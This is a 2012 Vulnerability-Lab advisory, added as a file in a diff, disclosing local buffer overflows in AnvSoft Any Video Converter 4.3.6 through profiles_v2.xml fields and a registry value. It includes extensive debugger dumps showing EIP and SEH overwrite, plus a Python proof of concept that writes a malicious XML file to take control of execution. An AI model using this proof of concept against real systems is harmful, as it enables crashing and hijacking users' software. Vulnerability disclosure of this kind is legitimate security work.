@@ -1,0 +1,408 @@
+Title:
+======
+AnvSoft Any Video Converter 4.3.6 - Multiple Buffer Overflow
+
+
+Date:
+=====
+2012-04-08
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=492
+
+
+VL-ID:
+=====
+492
+
+
+Introduction:
+=============
+An all-in-one user-friendly DVD ripper, Video Record, video converter, YouTube Downloader, 
+video editor and DVD burner, which helps you rip DVD and record/convert video for multimedia 
+devices, like iPhone 4, iPad, iPod, Google Android, PSP, Nokia, Samsung Galaxy with lossless quality.
+
+Features
+Support conversion on all DVD variations, input formats and output formats, such as AVI, MP4, MPEG, 
+MOV, WMV, 3GP, MKV, FLV, RMVB, WebM, MP3 etc. More...
+Record video and capture desktop activities.
+Screencast anything you see on screen.
+Support video conversion to iPhone, iPad, iPod, Apple TV, ePad, Samsung Galaxy S II, Amazon Kindle Fire etc.
+
+All other mobile devices: PS3, Blackberry, Xbox 360, Zune, Motorola Droid, etc. More...
+Download and convert YouTube and other online videos for portable devices.
+Burn videos to CD/DVD/Blu-ray disc with DVD customized menu.
+Convert 6 times faster with NVIDIA CUDA acceleration technology. More...
+Edit video: add subtitles, merge, clip, crop video and apply special effects.
+
+(Copy of the Vendor Homepage: http://www.any-video-converter.com )
+
+
+Abstract:
+=========
+A Vulnerability Laboratory Researcher discovered multiple Local Buffer Overflow vulnerabilities on AnvSoft Any Video 
+Converter Free / Pro / Ultimate v4.3.6
+
+
+Report-Timeline:
+================
+2012-04-08:	Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Affected Products:
+==================
+AnvSoft
+Product: Any Video Converter v4.3.6 Free|Pro|Ultimate
+
+
+Exploitation-Technique:
+=======================
+Local
+
+
+Severity:
+=========
+Critical
+
+
+Details:
+========
+Mulitple Buffer Overflow vulnerabilities are detected on AnvSoft Any Video Converter Free / Pro / Ultimate v4.3.6 (current version).
+The vulnerabilities are located in the main executeable `AVCUltimate.exe`. 
+
+1.
+When launching  `AVCUltimate.exe`, it automatically reads the contents of the `profiles_v2.xml` from the application directory. 
+The application does not validate the string length of different xml-fields before passing the content to a buffer, which could lead 
+to a local buffer overflow. Nearly every item in the `profiles_v2.xml` is vulnerable. As an example:
+
+<category name=``[vuln]`` id=``0`` icon=``[vuln]`` desc=``[vuln]``/>
+<group name=``[vuln]`` icon=``[vuln]`` desc=``[vuln]`` in_category=`` all, [vuln]``/>
+<profile name=``[vuln]``>
+
+--- Debug Logs ---
+#Disassembly:
+7C9132A6   FFD1             CALL ECX
+7C9132A8   64:8B25 00000000 MOV ESP,DWORD PTR FS:[0]
+7C9132AF   64:8F05 00000000 POP DWORD PTR FS:[0]
+7C9132B6   8BE5             MOV ESP,EBP
+7C9132B8   5D               POP EBP
+7C9132B9   C2 1400          RETN 14
+7C9132BC   8B4C24 04        MOV ECX,DWORD PTR SS:[ESP+4]
+7C9132C0   F741 04 06000000 TEST DWORD PTR DS:[ECX+4],6
+7C9132C7   B8 01000000      MOV EAX,1
+7C9132CC   75 12            JNZ SHORT ntdll.7C9132E0
+7C9132CE   8B4C24 08        MOV ECX,DWORD PTR SS:[ESP+8]
+7C9132D2   8B5424 10        MOV EDX,DWORD PTR SS:[ESP+10]
+7C9132D6   8B41 08          MOV EAX,DWORD PTR DS:[ECX+8]
+7C9132D9   8902             MOV DWORD PTR DS:[EDX],EAX
+7C9132DB   B8 02000000      MOV EAX,2
+7C9132E0   C2 1000          RETN 10
+
+
+#Registers:
+EAX 00000000
+ECX 42424242
+EDX 7C9132BC ntdll.7C9132BC
+EBX 00000000
+ESP 00125608
+EBP 00125628
+ESI 00000000
+EDI 00000000
+EIP 42424242
+
+
+#Dump:
+00125EB4  41 41 41 41 41 41 41 41  AAAAAAAA
+00125EBC  41 41 41 41 41 41 41 41  AAAAAAAA
+00125EC4  41 41 41 41 41 41 41 41  AAAAAAAA
+00125ECC  41 41 41 41 42 42 42 42  AAAABBBB
+00125ED4  43 43 43 43 43 43 43 43  CCCCCCCC
+00125EDC  43 43 43 43 43 43 43 43  CCCCCCCC
+00125EE4  43 43 43 43 43 43 43 43  CCCCCCCC
+
+
+#Stack:
+00125608   7C9132A8  RETURN to ntdll.7C9132A8
+0012560C   001256F0
+00125610   00125ECC  ASCII AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+00125614   0012570C
+00125618   001256C4
+0012561C   00125ECC  Pointer to next SEH record
+00125620   7C9132BC  SE handler
+00125624   00125ECC  ASCII AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+00125628  /001256D8
+0012562C  |7C91327A  RETURN to ntdll.7C91327A from ntdll.7C913282
+00125630  |001256F0
+00125634  |00125ECC  ASCII AAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+00125638  |0012570C
+0012563C  |001256C4
+00125640  |42424242
+
+
+Picture(s):
+                                            ../1.png
+
+
+
+2.
+During the start of the application the value `OutputFolder` from the registry key 
+[HKEY_CURRENT_USER/Software/AnvSoft/Any Video Converter Ultimate/Setting/Output] is read. 
+The application does not validate the string length of the registry value before passing the content to a buffer, which could 
+lead to a unicode-based local buffer overflow.
+
+Invalid parameter passed to C runtime function.
+Invalid parameter passed to C runtime function.
+
+(13f8.1620): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000041 ebx=035f8392 ecx=02ed0000 edx=035f799c esi=02ecf564 edi=02ecf128
+eip=7701bcac esp=02ecf070 ebp=02ecf08c iopl=0         nv up ei pl nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010217
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C://Windows/syswow64/msvcrt.dll - 
+msvcrt!vsnwprintf_l+0xbc:
+7701bcac 668901          mov     word ptr [ecx],ax        ds:002b:02ed0000=????
+
+
+02ecfde0: /AnvSoft/Any Video Converter/VideoConverter.exe - 
+VideoConverter+10041 (00410041)
+Invalid exception stack at 00410041
+
+
+EXCEPTION_PARAMETER1:  00000001
+EXCEPTION_PARAMETER2:  02ed0000
+WRITE_ADDRESS:  02ed0000 
+
+
+02ecf6b4 00200066 006f0076 006e006c 0072006f 0x61002d
+02ecf6b8 006f0076 006e006c 0072006f 0020006d 0x200066
+02ecf6bc 006e006c 0072006f 0020006d 00410041 0x6f0076
+02ecf6c0 0072006f 0020006d 00410041 00410041 0x6e006c
+02ecf6c4 0020006d 00410041 00410041 00410041 0x72006f
+02ecf6c8 00410041 00410041 00410041 00410041 0x20006d
+02ecf6cc 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6d0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6d4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6d8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6dc 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6e0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6e4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6e8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6ec 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6f0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6f4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6f8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf6fc 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf700 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf704 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf708 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf70c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf710 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf714 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf718 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf71c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf720 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf724 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf728 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf72c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf730 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf734 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf738 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf73c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf740 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf744 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf748 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf74c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf750 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf754 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf758 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf75c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf760 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf764 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf768 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf76c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf770 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf774 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf778 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf77c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf780 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf784 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf788 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf78c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf790 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf794 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf798 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf79c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7a0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7a4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7a8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7ac 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7b0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7b4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7b8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7bc 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7c0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7c4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7c8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7cc 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7d0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7d4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7d8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7dc 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7e0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7e4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7e8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7ec 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7f0 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7f4 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7f8 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf7fc 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf800 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf804 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf808 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf80c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf810 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf814 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf818 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf81c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf820 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf824 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf828 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf82c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf830 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf834 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf838 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf83c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf840 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf844 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf848 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf84c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf850 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf854 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf858 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf85c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf860 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf864 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf868 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf86c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf870 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf874 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf878 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf87c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf880 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf884 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf888 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf88c 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf890 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf894 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf898 00410041 00410041 00410041 00410041 VideoConverter+0x10041
+02ecf89c 00410041 00410041 00410041 00410041 VideoConverter+0x
+
+
+
+msvcrt!vsnwprintf_l+0xbc:
+7701bcac 668901          mov     word ptr [ecx],ax
+7701bcaf 830602          add     dword ptr [esi],2
+7701bcb2 8b4dfc          mov     ecx,dword ptr [ebp-4]
+7701bcb5 5f              pop     edi
+7701bcb6 5e              pop     esi
+7701bcb7 33cd            xor     ecx,ebp
+7701bcb9 5b              pop     ebx
+7701bcba e86adbffff      call    msvcrt!memset+0x99 (77019829)
+
+
+.exr 0xffffffffffffffff
+ExceptionAddress: 7701bcac (msvcrt!vsnwprintf_l+0x000000bc)
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 00000001
+   Parameter[1]: 02ed0000
+
+
+Picture(s):
+                                            ../2.png
+                                            ../3.png
+
+
+Proof of Concept:
+=================
+The locla buffer overflow vulnerabilities can be exploited by local attackers or restricted low privileged system accounts.
+For demonstration or reproduce ...
+
+#!/usr/bin/python
+ 
+# Exploit Title: AnvSoft Any Video Converter Free/Pro/Ultimate v4.3.6 Local Buffer Overflow
+# Version:       4.3.6
+# Software Link: http://www.any-video-converter.com
+# Notes:         Nearly all items in profiles_v2.xml are vulnerable
+# Howto:         Copy profiles_v2.xml to App-Dir --> Launch
+
+file="profiles_v2.xml"
+
+junk1="\x41" * 332
+boom="\x42\x42\x42\x42"
+junk2="\x43" * 100
+
+poc="<root>\n"
+poc=poc + "<categories>\n"
+poc=poc + "<category name=\"" + junk1 + boom + junk2 + "\" id=\"0\" icon=\"cat_all.bmp\" desc=\"All Profiles\"/>\n"
+poc=poc + "</categories>\n"
+poc=poc + "<groups></groups>\n<profiles></profiles>\n</root>\n"
+
+try:
+    print "[*] Creating exploit file...\n"
+    writeFile = open (file, "w")
+    writeFile.write( poc )
+    writeFile.close()
+    print "[*] File successfully created!"
+except:
+    print "[!] Error while creating file!"
+
+
+
+
+Risk:
+=====
+The security risk of both local buffer oveflow vulnerabilities are estimated as critical.
+
+
+Credits:
+========
+Vulnerability Research Laboratory Team - Benjamin Kunz Mejri (Rem0ve) [www.vulnerability-lab.com]
+Vulnerability Research Laboratory Team - Julien Ahrens (MrTuxracer) [www.inshell.net]
+
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+    						Copyright ? 2012|Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research@vulnerability-lab.com
+
+
